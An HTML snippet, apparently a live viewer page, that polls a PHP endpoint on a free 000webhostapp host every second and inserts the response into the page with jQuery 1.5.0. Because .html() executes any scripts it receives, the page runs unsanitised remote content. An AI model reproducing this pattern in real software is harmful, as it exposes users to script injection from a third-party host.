      <script src="https://yandex.st/jquery/1.5.0/jquery.min.js" type="text/javascript"></script>
    
    <div id="content"></div>

    <script>  
        function show()  
        {  
            $.ajax({  
                url: "https://approbatory-conspir.000webhostapp.com/video/screen.php",  
                cache: false,  
                success: function(html){  
                    $("#content").html(html);  
                }  
            });  
        }  
      
        $(document).ready(function(){  
            show();  
            setInterval('show()',1000);  
        });  
    </script>
